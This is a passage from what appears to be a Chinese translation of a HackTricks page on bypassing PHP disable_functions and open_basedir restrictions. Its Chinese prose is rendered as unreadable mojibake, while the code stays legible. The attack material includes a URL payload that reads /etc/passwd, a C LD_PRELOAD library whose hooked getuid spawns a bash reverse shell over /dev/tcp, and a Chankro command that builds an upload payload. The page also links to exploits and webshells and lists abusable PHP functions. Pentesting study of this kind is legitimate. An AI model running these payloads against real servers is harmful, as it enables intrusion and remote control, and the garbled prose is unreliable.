åªéœ€è®¿é—® <code>http://vulnerable.com:1337/l.php?cmd=echo file_get_contents('/etc/passwd');</code> å³å¯è·å– <code>/etc/passwd</code> æ–‡ä»¶çš„å†…å®¹ã€‚</p>
<p>{% hint style="warning" %}
ä½ å¯èƒ½ä¼šæƒ³ï¼Œæ­£å¦‚æˆ‘ä»¬è¦†ç›–äº† <code>open_basedir</code> é…ç½®ä¸€æ ·ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥ <strong>è¦†ç›– <code>disable_functions</code></strong>ã€‚å¥½å§ï¼Œè¯•è¯•å§ï¼Œä½†è¿™ä¸ä¼šæœ‰æ•ˆï¼Œæ˜¾ç„¶ <strong><code>disable_functions</code> åªèƒ½åœ¨ <code>.ini</code> php</strong> é…ç½®æ–‡ä»¶ä¸­è¿›è¡Œé…ç½®ï¼Œè€Œä½ ä½¿ç”¨ PHP_VALUE è¿›è¡Œçš„æ›´æ”¹åœ¨è¿™ä¸ªç‰¹å®šè®¾ç½®ä¸Šä¸ä¼šç”Ÿæ•ˆã€‚
{% endhint %}</p>
<h2 id="disable_functions-ç»•è¿‡"><a class="header" href="#disable_functions-ç»•è¿‡">disable_functions ç»•è¿‡</a></h2>
<p>å¦‚æœä½ èƒ½å¤Ÿåœ¨æœºå™¨ä¸Šæ‰§è¡Œ PHP ä»£ç ï¼Œä½ å¯èƒ½æƒ³è¦æ›´è¿›ä¸€æ­¥ï¼Œ<strong>æ‰§è¡Œä»»æ„ç³»ç»Ÿå‘½ä»¤</strong>ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œé€šå¸¸ä¼šå‘ç°å¤§å¤šæ•°æˆ–æ‰€æœ‰å…è®¸ <strong>æ‰§è¡Œç³»ç»Ÿå‘½ä»¤çš„ PHP å‡½æ•°éƒ½å·²è¢«ç¦ç”¨</strong> åœ¨ <strong><code>disable_functions</code></strong> ä¸­ã€‚<br />
é‚£ä¹ˆï¼Œè®©æˆ‘ä»¬çœ‹çœ‹ä½ å¦‚ä½•å¯ä»¥ç»•è¿‡è¿™ä¸ªé™åˆ¶ï¼ˆå¦‚æœå¯ä»¥çš„è¯ï¼‰</p>
<h3 id="è‡ªåŠ¨ç»•è¿‡å‘ç°"><a class="header" href="#è‡ªåŠ¨ç»•è¿‡å‘ç°">è‡ªåŠ¨ç»•è¿‡å‘ç°</a></h3>
<p>ä½ å¯ä»¥ä½¿ç”¨å·¥å…· <a href="https://github.com/teambi0s/dfunc-bypasser">https://github.com/teambi0s/dfunc-bypasser</a>ï¼Œå®ƒä¼šæŒ‡ç¤ºä½ å¯ä»¥ä½¿ç”¨å“ªä¸ªå‡½æ•°ï¼ˆå¦‚æœæœ‰çš„è¯ï¼‰æ¥ <strong>ç»•è¿‡</strong> <strong><code>disable_functions</code></strong>ã€‚</p>
<h3 id="ä½¿ç”¨å…¶ä»–ç³»ç»Ÿå‡½æ•°ç»•è¿‡"><a class="header" href="#ä½¿ç”¨å…¶ä»–ç³»ç»Ÿå‡½æ•°ç»•è¿‡">ä½¿ç”¨å…¶ä»–ç³»ç»Ÿå‡½æ•°ç»•è¿‡</a></h3>
<p>åªéœ€è¿”å›åˆ°æœ¬é¡µçš„å¼€å¤´ï¼Œ<strong>æ£€æŸ¥æ˜¯å¦æœ‰ä»»ä½•æ‰§è¡Œå‘½ä»¤çš„å‡½æ•°æœªè¢«ç¦ç”¨å¹¶åœ¨ç¯å¢ƒä¸­å¯ç”¨</strong>ã€‚å¦‚æœä½ æ‰¾åˆ°å…¶ä¸­çš„ä¸€ä¸ªï¼Œä½ å°†èƒ½å¤Ÿä½¿ç”¨å®ƒæ¥æ‰§è¡Œä»»æ„ç³»ç»Ÿå‘½ä»¤ã€‚</p>
<h3 id="ld_preload-ç»•è¿‡"><a class="header" href="#ld_preload-ç»•è¿‡">LD_PRELOAD ç»•è¿‡</a></h3>
<p>ä¼—æ‰€å‘¨çŸ¥ï¼ŒPHP ä¸­çš„ä¸€äº›å‡½æ•°å¦‚ <code>mail()</code> å°†ä¼š <strong>åœ¨ç³»ç»Ÿå†…æ‰§è¡ŒäºŒè¿›åˆ¶æ–‡ä»¶</strong>ã€‚å› æ­¤ï¼Œä½ å¯ä»¥åˆ©ç”¨å®ƒä»¬ä½¿ç”¨ç¯å¢ƒå˜é‡ <code>LD_PRELOAD</code> æ¥ä½¿å®ƒä»¬åŠ è½½ä¸€ä¸ªå¯ä»¥æ‰§è¡Œä»»ä½•å†…å®¹çš„ä»»æ„åº“ã€‚</p>
<h4 id="å¯ä»¥ç”¨æ¥é€šè¿‡-ld_preload-ç»•è¿‡-disable_functions-çš„å‡½æ•°"><a class="header" href="#å¯ä»¥ç”¨æ¥é€šè¿‡-ld_preload-ç»•è¿‡-disable_functions-çš„å‡½æ•°">å¯ä»¥ç”¨æ¥é€šè¿‡ LD_PRELOAD ç»•è¿‡ disable_functions çš„å‡½æ•°</a></h4>
<ul>
<li><strong><code>mail</code></strong></li>
<li><strong><code>mb_send_mail</code></strong>ï¼šåœ¨å®‰è£…äº† <code>php-mbstring</code> æ¨¡å—æ—¶æœ‰æ•ˆã€‚</li>
<li><strong><code>imap_mail</code></strong>ï¼šå¦‚æœå­˜åœ¨ <code>php-imap</code> æ¨¡å—åˆ™æœ‰æ•ˆã€‚</li>
<li><strong><code>libvirt_connect</code></strong>ï¼šéœ€è¦ <code>php-libvirt-php</code> æ¨¡å—ã€‚</li>
<li><strong><code>gnupg_init</code></strong>ï¼šåœ¨å®‰è£…äº† <code>php-gnupg</code> æ¨¡å—æ—¶å¯ç”¨ã€‚</li>
<li><strong><code>new imagick()</code></strong>ï¼šè¿™ä¸ªç±»å¯ä»¥è¢«æ»¥ç”¨ä»¥ç»•è¿‡é™åˆ¶ã€‚è¯¦ç»†çš„åˆ©ç”¨æŠ€æœ¯å¯ä»¥åœ¨å…¨é¢çš„ <a href="https://blog.bi0s.in/2019/10/23/Web/BSidesDelhi19-evalme/"><strong>å†™ä½œä¸­æ‰¾åˆ°</strong></a>ã€‚</li>
</ul>
<p>ä½ å¯ä»¥ <a href="https://github.com/tarunkant/fuzzphunc/blob/master/lazyFuzzer.py"><strong>åœ¨è¿™é‡Œæ‰¾åˆ°</strong></a> ç”¨äºå‘ç°è¿™äº›å‡½æ•°çš„æ¨¡ç³Šæµ‹è¯•è„šæœ¬ã€‚</p>
<p>è¿™æ˜¯ä¸€ä¸ªä½ å¯ä»¥ç¼–è¯‘ä»¥æ»¥ç”¨ <code>LD_PRELOAD</code> ç¯å¢ƒå˜é‡çš„åº“ï¼š</p>
<pre><code class="language-php">#include &lt;unistd.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;

uid_t getuid(void){
unsetenv("LD_PRELOAD");
system("bash -c \"sh -i &gt;&amp; /dev/tcp/127.0.0.1/1234 0&gt;&amp;1\"");
return 1;
}
</code></pre>
<h4 id="é€šè¿‡-chankro-ç»•è¿‡"><a class="header" href="#é€šè¿‡-chankro-ç»•è¿‡">é€šè¿‡ Chankro ç»•è¿‡</a></h4>
<p>ä¸ºäº†åˆ©ç”¨è¿™ä¸ªé”™è¯¯é…ç½®ï¼Œä½ å¯ä»¥ä½¿ç”¨ <a href="https://github.com/TarlogicSecurity/Chankro"><strong>Chankro</strong></a>ã€‚è¿™æ˜¯ä¸€ä¸ª <strong>ç”Ÿæˆ PHP æ¼æ´</strong> çš„å·¥å…·ï¼Œä½ éœ€è¦å°†å…¶ä¸Šä¼ åˆ°æ˜“å—æ”»å‡»çš„æœåŠ¡å™¨å¹¶æ‰§è¡Œå®ƒï¼ˆé€šè¿‡ç½‘é¡µè®¿é—®ï¼‰ã€‚<br />
<strong>Chankro</strong> å°†åœ¨å—å®³è€…çš„ç£ç›˜ä¸Šå†™å…¥ä½ æƒ³è¦æ‰§è¡Œçš„ <strong>åº“å’Œåå‘ shell</strong>ï¼Œå¹¶å°†ä½¿ç”¨ <strong><code>LD_PRELOAD</code> æŠ€å·§ + PHP <code>mail()</code></strong> å‡½æ•°æ¥æ‰§è¡Œåå‘ shellã€‚</p>
<p>è¯·æ³¨æ„ï¼Œä¸ºäº†ä½¿ç”¨ <strong>Chankro</strong>ï¼Œ<code>mail</code> å’Œ <code>putenv</code> <strong>ä¸èƒ½å‡ºç°åœ¨ <code>disable_functions</code> åˆ—è¡¨ä¸­</strong>ã€‚<br />
åœ¨ä»¥ä¸‹ç¤ºä¾‹ä¸­ï¼Œä½ å¯ä»¥çœ‹åˆ°å¦‚ä½•ä¸º <strong>arch 64</strong> <strong>åˆ›å»ºä¸€ä¸ª chankro æ¼æ´</strong>ï¼Œå®ƒå°†æ‰§è¡Œ <code>whoami</code> å¹¶å°†è¾“å‡ºä¿å­˜åˆ° <em>/tmp/chankro_shell.out</em>ï¼Œchankro å°† <strong>åœ¨ <em>/tmp</em> ä¸­å†™å…¥åº“å’Œæœ‰æ•ˆè½½è·</strong>ï¼Œ<strong>æœ€ç»ˆæ¼æ´</strong> å°†è¢«ç§°ä¸º <strong>bicho.php</strong>ï¼ˆè¿™æ˜¯ä½ éœ€è¦ä¸Šä¼ åˆ°å—å®³è€…æœåŠ¡å™¨çš„æ–‡ä»¶ï¼‰ï¼š</p>
<p>{% tabs %}
{% tab title="shell.sh" %}</p>
<pre><code class="language-php">#!/bin/sh
whoami &gt; /tmp/chankro_shell.out
</code></pre>
<p>{% endtab %}</p>
<p>{% tab title="Chankro" %}</p>
<pre><code class="language-bash">python2 chankro.py --arch 64 --input shell.sh --path /tmp --output bicho.php
</code></pre>
<p>{% endtab %}
{% endtabs %}</p>
<p>å¦‚æœæ‚¨å‘ç° <strong>mail</strong> å‡½æ•°è¢«ç¦ç”¨å‡½æ•°é˜»æ­¢ï¼Œæ‚¨ä»ç„¶å¯ä»¥ä½¿ç”¨ <strong>mb_send_mail.</strong><br />
æœ‰å…³æ­¤æŠ€æœ¯å’Œ Chankro çš„æ›´å¤šä¿¡æ¯ï¼Œè¯·è®¿é—®ï¼š<a href="https://www.tarlogic.com/en/blog/how-to-bypass-disable_functions-and-open_basedir/">https://www.tarlogic.com/en/blog/how-to-bypass-disable_functions-and-open_basedir/</a></p>
<h3 id="ç»•è¿‡-ä½¿ç”¨-php-åŠŸèƒ½"><a class="header" href="#ç»•è¿‡-ä½¿ç”¨-php-åŠŸèƒ½">"ç»•è¿‡" ä½¿ç”¨ PHP åŠŸèƒ½</a></h3>
<p>è¯·æ³¨æ„ï¼Œä½¿ç”¨ <strong>PHP</strong> æ‚¨å¯ä»¥ <strong>è¯»å–å’Œå†™å…¥æ–‡ä»¶ï¼Œåˆ›å»ºç›®å½•å’Œæ›´æ”¹æƒé™</strong>ã€‚<br />
æ‚¨ç”šè‡³å¯ä»¥ <strong>è½¬å‚¨æ•°æ®åº“</strong>ã€‚<br />
ä¹Ÿè®¸ä½¿ç”¨ <strong>PHP</strong> æ¥ <strong>æšä¸¾</strong> è¯¥ä¸»æœºï¼Œæ‚¨å¯ä»¥æ‰¾åˆ°æå‡æƒé™/æ‰§è¡Œå‘½ä»¤çš„æ–¹æ³•ï¼ˆä¾‹å¦‚è¯»å–æŸäº›ç§æœ‰ ssh å¯†é’¥ï¼‰ã€‚</p>
<p>æˆ‘åˆ›å»ºäº†ä¸€ä¸ª webshellï¼Œä½¿æ‰§è¡Œè¿™äº›æ“ä½œå˜å¾—éå¸¸ç®€å•ï¼ˆè¯·æ³¨æ„ï¼Œå¤§å¤šæ•° webshell ä¹Ÿä¼šä¸ºæ‚¨æä¾›è¿™äº›é€‰é¡¹ï¼‰ï¼š<a href="https://github.com/carlospolop/phpwebshelllimited">https://github.com/carlospolop/phpwebshelllimited</a></p>
<h3 id="æ¨¡å—ç‰ˆæœ¬ä¾èµ–çš„ç»•è¿‡"><a class="header" href="#æ¨¡å—ç‰ˆæœ¬ä¾èµ–çš„ç»•è¿‡">æ¨¡å—/ç‰ˆæœ¬ä¾èµ–çš„ç»•è¿‡</a></h3>
<p>å¦‚æœä½¿ç”¨æŸä¸ªç‰¹å®šæ¨¡å—æˆ–åˆ©ç”¨æŸä¸ªç‰¹å®š PHP ç‰ˆæœ¬ï¼Œæœ‰å‡ ç§æ–¹æ³•å¯ä»¥ç»•è¿‡ disable_functionsï¼š</p>
<ul>
<li><a href="disable_functions-bypass-php-fpm-fastcgi.html"><strong>FastCGI/PHP-FPM (FastCGI è¿›ç¨‹ç®¡ç†å™¨)</strong></a></li>
<li><a href="https://github.com/carlospolop/hacktricks/blob/master/network-services-pentesting/pentesting-web/php-tricks-esp/php-useful-functions-disable_functions-open_basedir-bypass/broken-reference/README.md"><strong>ä½¿ç”¨ FFI - å¤–éƒ¨å‡½æ•°æ¥å£å¯ç”¨çš„ç»•è¿‡</strong></a></li>
<li><a href="disable_functions-bypass-via-mem.html"><strong>é€šè¿‡å†…å­˜ç»•è¿‡</strong></a></li>
<li><a href="disable_functions-bypass-mod_cgi.html"><strong>mod_cgi</strong></a></li>
<li><a href="disable_functions-bypass-php-perl-extension-safe_mode-bypass-exploit.html"><strong>PHP Perl æ‰©å±•å®‰å…¨æ¨¡å¼</strong></a></li>
<li><a href="disable_functions-bypass-dl-function.html"><strong>dl å‡½æ•°</strong></a></li>
<li><a href="https://github.com/mm0r1/exploits/tree/master/php-filter-bypass"><strong>æ­¤æ¼æ´</strong></a></li>
<li>5.* - é€šè¿‡å¯¹ PoC è¿›è¡Œå°å¹…æ›´æ”¹å¯åˆ©ç”¨</li>
<li>7.0 - è¿„ä»Šä¸ºæ­¢çš„æ‰€æœ‰ç‰ˆæœ¬</li>
<li>7.1 - è¿„ä»Šä¸ºæ­¢çš„æ‰€æœ‰ç‰ˆæœ¬</li>
<li>7.2 - è¿„ä»Šä¸ºæ­¢çš„æ‰€æœ‰ç‰ˆæœ¬</li>
<li>7.3 - è¿„ä»Šä¸ºæ­¢çš„æ‰€æœ‰ç‰ˆæœ¬</li>
<li>7.4 - è¿„ä»Šä¸ºæ­¢çš„æ‰€æœ‰ç‰ˆæœ¬</li>
<li>8.0 - è¿„ä»Šä¸ºæ­¢çš„æ‰€æœ‰ç‰ˆæœ¬</li>
<li><a href="https://github.com/mm0r1/exploits/blob/master/php-filter-bypass/exploit.php"><strong>ä» 7.0 åˆ° 8.0 çš„æ¼æ´ï¼ˆä»…é™ Unixï¼‰</strong></a></li>
<li><a href="disable_functions-bypass-php-7.0-7.4-nix-only.html#php-7-0-7-4-nix-only"><strong>PHP 7.0=7.4 (*nix)</strong></a></li>
<li><a href="disable_functions-bypass-imagick-less-than-3.3.0-php-greater-than-5.4-exploit.html"><strong>Imagick 3.3.0 PHP &gt;= 5.4</strong></a></li>
<li><a href="disable_functions-php-5.x-shellshock-exploit.html"><strong>PHP 5.x Shellsock</strong></a></li>
<li><a href="disable_functions-php-5.2.4-ioncube-extension-exploit.html"><strong>PHP 5.2.4 ionCube</strong></a></li>
<li><a href="disable_functions-bypass-php-less-than-5.2.9-on-windows.html"><strong>PHP &lt;= 5.2.9 Windows</strong></a></li>
<li><a href="disable_functions-bypass-php-5.2.4-and-5.2.5-php-curl.html"><strong>PHP 5.2.4/5.2.5 cURL</strong></a></li>
<li><a href="disable_functions-bypass-php-5.2.3-win32std-ext-protections-bypass.html"><strong>PHP 5.2.3 -Win32std</strong></a></li>
<li><a href="disable_functions-bypass-php-5.2-fopen-exploit.html"><strong>PHP 5.2 FOpen æ¼æ´</strong></a></li>
<li><a href="disable_functions-bypass-php-4-greater-than-4.2.0-php-5-pcntl_exec.html"><strong>PHP 4 &gt;= 4.2.-, PHP 5 pcntl_exec</strong></a></li>
</ul>
<h3 id="è‡ªåŠ¨å·¥å…·"><a class="header" href="#è‡ªåŠ¨å·¥å…·"><strong>è‡ªåŠ¨å·¥å…·</strong></a></h3>
<p>ä»¥ä¸‹è„šæœ¬å°è¯•äº†ä¸€äº›è¿™é‡Œæåˆ°çš„æ–¹æ³•ï¼š<br />
<a href="https://github.com/l3m0n/Bypass_Disable_functions_Shell/blob/master/shell.php">https://github.com/l3m0n/Bypass_Disable_functions_Shell/blob/master/shell.php</a></p>
<h2 id="å…¶ä»–æœ‰è¶£çš„-php-å‡½æ•°"><a class="header" href="#å…¶ä»–æœ‰è¶£çš„-php-å‡½æ•°">å…¶ä»–æœ‰è¶£çš„ PHP å‡½æ•°</a></h2>
<h3 id="æ¥å—å›è°ƒçš„å‡½æ•°åˆ—è¡¨"><a class="header" href="#æ¥å—å›è°ƒçš„å‡½æ•°åˆ—è¡¨">æ¥å—å›è°ƒçš„å‡½æ•°åˆ—è¡¨</a></h3>
<p>è¿™äº›å‡½æ•°æ¥å—ä¸€ä¸ªå­—ç¬¦ä¸²å‚æ•°ï¼Œå¯ä»¥ç”¨æ¥è°ƒç”¨æ”»å‡»è€…é€‰æ‹©çš„å‡½æ•°ã€‚æ ¹æ®å‡½æ•°çš„ä¸åŒï¼Œæ”»å‡»è€…å¯èƒ½æœ‰æˆ–æ²¡æœ‰èƒ½åŠ›ä¼ é€’å‚æ•°ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå¯ä»¥ä½¿ç”¨ä¿¡æ¯æ³„éœ²å‡½æ•°ï¼Œå¦‚ phpinfo()ã€‚</p>
<p><a href="https://www.php.net/manual/en/language.types.callable.php">å›è°ƒ / å¯è°ƒç”¨</a></p>
<p><a href="https://stackoverflow.com/questions/3115559/exploitable-php-functions">ä»è¿™é‡Œå¼€å§‹çš„åç»­åˆ—è¡¨</a></p>
<pre><code class="language-php">// Function =&gt; Position of callback arguments
'ob_start' =&gt; 0,
'array_diff_uassoc' =&gt; -1,
'array_diff_ukey' =&gt; -1,
'array_filter' =&gt; 1,
'array_intersect_uassoc' =&gt; -1,
'array_intersect_ukey' =&gt; -1,
'array_map' =&gt; 0,
'array_reduce' =&gt; 1,
'array_udiff_assoc' =&gt; -1,
'array_udiff_uassoc' =&gt; array(-1, -2),
'array_udiff' =&gt; -1,
'array_uintersect_assoc' =&gt; -1,
'array_uintersect_uassoc' =&gt; array(-1, -2),
'array_uintersect' =&gt; -1,
'array_walk_recursive' =&gt; 1,
'array_walk' =&gt; 1,
'assert_options' =&gt; 1,
'uasort' =&gt; 1,
'uksort' =&gt; 1,
'usort' =&gt; 1,
'preg_replace_callback' =&gt; 1,
'spl_autoload_register' =&gt; 0,
'iterator_apply' =&gt; 1,
'call_user_func' =&gt; 0,
'call_user_func_array' =&gt; 0,
'register_shutdown_function' =&gt; 0,
'register_tick_function' =&gt; 0,
'set_error_handler' =&gt; 0,
'set_exception_handler' =&gt; 0,
'session_set_save_handler' =&gt; array(0, 1, 2, 3, 4, 5),
'sqlite_create_aggregate' =&gt; array(2, 3),
'sqlite_create_function' =&gt; 2,
</code></pre>
<h3 id="ä¿¡æ¯æ³„éœ²"><a class="header" href="#ä¿¡æ¯æ³„éœ²">ä¿¡æ¯æ³„éœ²</a></h3>
<p>å¤§å¤šæ•°è¿™äº›å‡½æ•°è°ƒç”¨ä¸æ˜¯æ•°æ®æ±‡èšç‚¹ã€‚ä½†å¦‚æœè¿”å›çš„ä»»ä½•æ•°æ®å¯¹æ”»å‡»è€…å¯è§ï¼Œåˆ™å¯èƒ½å­˜åœ¨æ¼æ´ã€‚å¦‚æœæ”»å‡»è€…å¯ä»¥çœ‹åˆ° phpinfo()ï¼Œè¿™ç»å¯¹æ˜¯ä¸€ä¸ªæ¼æ´ã€‚</p>
<pre><code class="language-php">phpinfo
posix_mkfifo
posix_getlogin
posix_ttyname
getenv
get_current_user
proc_get_status
get_cfg_var
disk_free_space
disk_total_space
diskfreespace
getcwd
getlastmo
getmygid
getmyinode
getmypid
getmyuid
</code></pre>
<h3 id="å…¶ä»–"><a class="header" href="#å…¶ä»–">å…¶ä»–</a></h3>
<pre><code class="language-php">extract    // Opens the door for register_globals attacks (see study in scarlet).
parse_str  // works like extract if only one argument is given.
putenv
ini_set
mail       // has CRLF injection in the 3rd parameter, opens the door for spam.
header     // on old systems CRLF injection could be used for xss or other purposes, now it is still a problem if they do a header("location: ..."); and they do not die();. The script keeps executing after a call to header(), and will still print output normally. This is nasty if you are trying to protect an administrative area.
proc_nice
proc_terminate
proc_close
pfsockopen
fsockopen
apache_child_terminate
posix_kill
posix_mkfifo
posix_setpgid
posix_setsid
posix_setuid
</code></pre>
<h3 id="æ–‡ä»¶ç³»ç»Ÿå‡½æ•°"><a class="header" href="#æ–‡ä»¶ç³»ç»Ÿå‡½æ•°">æ–‡ä»¶ç³»ç»Ÿå‡½æ•°</a></h3>
<p>æ ¹æ® RATSï¼Œphp ä¸­çš„æ‰€æœ‰æ–‡ä»¶ç³»ç»Ÿå‡½æ•°éƒ½å¾ˆç³Ÿç³•ã€‚å…¶ä¸­ä¸€äº›å¯¹æ”»å‡»è€…ä¼¼ä¹å¹¶ä¸å¤ªæœ‰ç”¨ã€‚å…¶ä»–çš„åˆ™æ¯”ä½ æƒ³è±¡çš„æ›´æœ‰ç”¨ã€‚ä¾‹å¦‚ï¼Œå¦‚æœ allow_url_fopen=Onï¼Œåˆ™å¯ä»¥å°† URL ç”¨ä½œæ–‡ä»¶è·¯å¾„ï¼Œå› æ­¤è°ƒç”¨ copy($_GET['s'], $_GET['d']); å¯ä»¥ç”¨æ¥åœ¨ç³»ç»Ÿä¸Šçš„ä»»ä½•åœ°æ–¹ä¸Šä¼  PHP è„šæœ¬ã€‚æ­¤å¤–ï¼Œå¦‚æœä¸€ä¸ªç«™ç‚¹å®¹æ˜“å—åˆ°é€šè¿‡ GET å‘é€çš„è¯·æ±‚çš„æ”»å‡»ï¼Œé‚£ä¹ˆæ‰€æœ‰è¿™äº›æ–‡ä»¶ç³»ç»Ÿå‡½æ•°éƒ½å¯ä»¥è¢«æ»¥ç”¨ï¼Œä»¥é€šè¿‡ä½ çš„æœåŠ¡å™¨å°†æ”»å‡»å¼•å¯¼åˆ°å¦ä¸€ä¸ªä¸»æœºã€‚</p>
<p><strong>æ‰“å¼€æ–‡ä»¶ç³»ç»Ÿå¤„ç†ç¨‹åº</strong></p>
<pre><code class="language-php">fopen
tmpfile
bzopen
gzopen
SplFileObject-&gt;__construct
</code></pre>
<p><strong>å†™å…¥æ–‡ä»¶ç³»ç»Ÿï¼ˆéƒ¨åˆ†ç»“åˆè¯»å–ï¼‰</strong></p>
<pre><code class="language-php">chgrp
chmod
chown
copy
file_put_contents
lchgrp
lchown
link
mkdir
move_uploaded_file
rename
rmdir
symlink
tempnam
touch
unlink
imagepng     // 2nd parameter is a path.
imagewbmp    // 2nd parameter is a path.
image2wbmp   // 2nd parameter is a path.
imagejpeg    // 2nd parameter is a path.
imagexbm     // 2nd parameter is a path.
imagegif     // 2nd parameter is a path.
imagegd      // 2nd parameter is a path.
imagegd2     // 2nd parameter is a path.
iptcembed
ftp_get
ftp_nb_get
scandir
</code></pre>
<p><strong>ä»æ–‡ä»¶ç³»ç»Ÿè¯»å–</strong></p>
<pre><code class="language-php">file_exists
-- file_get_contents
file
fileatime
filectime
filegroup
fileinode
filemtime
fileowner
fileperms
filesize
filetype
glob
is_dir
is_executable
is_file
is_link
is_readable
is_uploaded_file
is_writable
is_writeable
linkinfo
lstat
parse_ini_file
pathinfo
readfile
readlink
realpath
stat
gzfile
readgzfile
getimagesize
imagecreatefromgif
imagecreatefromjpeg
imagecreatefrompng
imagecreatefromwbmp
imagecreatefromxbm
imagecreatefromxpm
ftp_put
ftp_nb_put
exif_read_data
read_exif_data
exif_thumbnail
exif_imagetype
hash_file
hash_hmac_file
hash_update_file
md5_file
sha1_file
-- highlight_file
-- show_source
php_strip_whitespace
get_meta_tags
</code></pre>
<p>{% hint style="success" %}
å­¦ä¹ ä¸å®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)</strong></a><img src="/.gitbook/assets/arte.png" alt="" data-size="line"><br />
å­¦ä¹ ä¸å®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)</strong><img src="/.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
<details>
<summary>æ”¯æŒ HackTricks</summary>
<ul>
<li>æŸ¥çœ‹ <a href="https://github.com/sponsors/carlospolop"><strong>è®¢é˜…è®¡åˆ’</strong></a>!</li>
<li><strong>åŠ å…¥</strong> ğŸ’¬ <a href="https://discord.gg/hRep4RUj7f"><strong>Discord ç¾¤ç»„</strong></a> æˆ– <a href="https://t.me/peass"><strong>Telegram ç¾¤ç»„</strong></a> æˆ– <strong>å…³æ³¨</strong> æˆ‘ä»¬çš„ <strong>Twitter</strong> ğŸ¦ <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>.</strong></li>
<li><strong>é€šè¿‡å‘</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> å’Œ <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> GitHub ä»“åº“æäº¤ PR æ¥åˆ†äº«é»‘å®¢æŠ€å·§ã€‚</li>
</ul>
</details>
{% endhint %}

                    </main>

                    <nav class="nav-wrapper" aria-label="Page navigation">
                        <!-- Mobile navigation buttons -->
                            <a rel="prev" href="../../../../network-services-pentesting/pentesting-web/php-tricks-esp/index.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                                <i class="fa fa-angle-left"></i>
                            </a>

                            <a rel="next prefetch" href="../../../../network-services-pentesting/pentesting-web/php-tricks-esp/php-useful-functions-disable_functions-open_basedir-bypass/disable_functions-bypass-php-fpm-fastcgi.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                                <i class="fa fa-angle-right"></i>
                            </a>

                        <div style="clear: both"></div>
                    </nav>
                </div>
            </div>

            <nav class="nav-wide-wrapper" aria-label="Page navigation">
                    <a rel="prev" href="../../../../network-services-pentesting/pentesting-web/php-tricks-esp/index.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                        <i class="fa fa-angle-left"></i>
                    </a>

                    <a rel="next prefetch" href="../../../../network-services-pentesting/pentesting-web/php-tricks-esp/php-useful-functions-disable_functions-open_basedir-bypass/disable_functions-bypass-php-fpm-fastcgi.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                        <i class="fa fa-angle-right"></i>
                    </a>
            </nav>

        </div>




        <script>
            window.playground_copyable = true;
        </script>


        <script src="../../../../elasticlunr.min.js"></script>
        <script src="../../../../mark.min.js"></script>
        <script src="../../../../searcher.js"></script>

        <script src="../../../../clipboard.min.js"></script>
        <script src="../../../../highlight.js"></script>
        <script src="../../../../book.js"></script>

        <!-- Custom JS scripts -->


    </div>
    </body>
</html>
